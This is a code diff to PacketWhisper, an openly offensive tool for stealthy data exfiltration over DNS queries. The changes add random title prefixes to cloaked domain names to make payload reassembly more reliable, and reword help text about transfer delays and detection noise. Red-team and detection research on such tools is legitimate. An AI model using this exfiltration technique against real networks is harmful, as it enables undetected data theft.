@@ -132,7 +132,7 @@ def CloakAndTransferFile():
 		print ""
 		print "1) Half-Second (Recommended, slow but reliable)"
 		print "2) 5 Seconds (Extremely slow but stealthy)"
-		print "3) No delay (Fast but loud, risks corrupting payload)"
+		print "3) No delay (Faster but loud, risks corrupting payload)"
 		print ""
 
 		try:
@@ -420,7 +420,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 
 	scriptFilename = gRandomSubdomainFQDNCipherFiles[ cipherNum ] + ".py"
 
-	print "Adding subdomain randomization to cloaked file using :", scriptFilename
+	print "Adding subdomain randomization to cloaked file using :" + scriptFilename
 
 	try:
 		os.system( "ciphers/subdomain_randomizer_scripts/%s %s" % ( scriptFilename, cloakedFile ))
@@ -438,18 +438,56 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 #
 # SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
 #
-# Easy cipher category, all we need to do is do a stright invocation of
-# Cloakify with the matching cipher name.
+# After calling Cloakify with selected cipher, add a random formal title 
+# to thefront of each FQDN. Example "John.Smallberries.yoyodyne.com"
+# becomes "Dr.John.Smallberries.yoyodyne.com"
+#
+# Adding a random element to this cipher category allows us to easily
+# identify and ignore duplicate DNS requests that would corrupt our
+# transfer. We just have to be sure that each title we append is different
+# from the one that came before it.
 #
 #========================================================================
 
 def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):
+
+	titleArray = [ "Mr", "Dr", "Sir", "Prof", "Lord", "Capt", "Duke" ]
 
 	cipherNum = SelectCipher( gRepeatedSubdomainFQDNCipherFiles )
 
 	cipherFilePath = gFilepathRepeatedUniqueFQDN + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ] 
 
 	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
+
+	# Time to add some randomization
+
+	lastTitle = ""
+	newTitle = ""
+
+	# DEBUG
+	# Print "%%%", cloakedFile
+
+    	with open( cloakedFile, "r" ) as file:
+
+            	cloakedPayload = file.read().splitlines()
+
+    	with open( cloakedFile, "w" ) as file:
+
+        	for line in cloakedPayload:
+
+			# Only need to be sure it's not the same as the one
+			# used before it, so we can identify and ignore duplicate
+			# DNS requests when recovering the payload later.
+
+                	newTitle = titleArray[ random.randint(0,6) ]
+
+			while newTitle == lastTitle:
+                		newTitle = titleArray[ random.randint(0,6) ]
+
+			# Add the title to the cihper string and all is well
+            		file.write( newTitle + "." + line + "\n" )
+
+			lastTitle = newTitle
 
 	return( cipherFilePath )
 
@@ -785,28 +823,26 @@ def ExtractCapturedPayload():
 
 	# isRandomized lets us track if the cipher is randomized and therefore
 	# for all practical purposes there will never be adjacent duplicate 
-	# FQDNs in the PCAP file. Turns out this is a really simple way of
-	# preventing duplicate DNS queries
+	# FQDNs in the PCAP file. This is a really simple way of identifying and 
+	# skipping duplicate DNS queries
 
-	isRandomized = "False"
+	isRandomized = "True"
 
 	# For Random Subdomain FQDN ciphers, use the base domain name as extra filter
 	# For Common FQDN ciphers, use the IP address that sent the knock sequence
 
 	if ( akstatStr in cipherFilePath ):
 		cipherTag = akstatStr;
-		isRandomized = "True"
 
 	elif ( cloudfrontStr in cipherFilePath ):
 		cipherTag = cloudfrontStr;
-		isRandomized = "True"
 
 	elif ( optimizelyStr in cipherFilePath ):
 		cipherTag = optimizelyStr;
-		isRandomized = "True"
 
 	elif ( commonFQDNStr in cipherFilePath ):
 		cipherTag = commonFQDNStr
+		isRandomized = "False"
 
 
 	# If it's a Common FQDN cipher, we have to use the embedded knock sequence
@@ -1140,10 +1176,13 @@ def Help():
 	print ""
 	print "Not a high-bandwidth transfer method. PacketWhisper relies on DNS queries,"
 	print "which are UDP-based, meaning order of delivery (or even successful delivery)"
-	print "of the request is not guranteed. For this reason, PacketWhisper adds a small"
-	print "(half-second or less) delay between each DNS query. You can safely transfer"
-	print "payloads at a rate of about 7.2K per hour (120 bytes per minute). That's based"
-	print "on the size of the original payload, not the Cloakified output file."
+	print "of the request is not guranteed. For this reason, PacketWhisper by default"
+	print "adds a small (half-second) delay between each DNS query. This will safely"
+	print "transfer payloads at a rate of about 7.2K per hour (120 bytes per minute),"
+	print "based on the size of the original payload, not the Cloakified output file."
+	print ""
+	print "You can opt for no delay between between queries, which dramatically speeds"
+	print "up the transfer but at the risk of increased network noise and corrupted payload."
 	print ""
 	print "If you have other datapaths available (HTTP outbound, etc.) then just use"
 	print "the Cloakify project (GitHub project URL above) and its standard ciphers,"
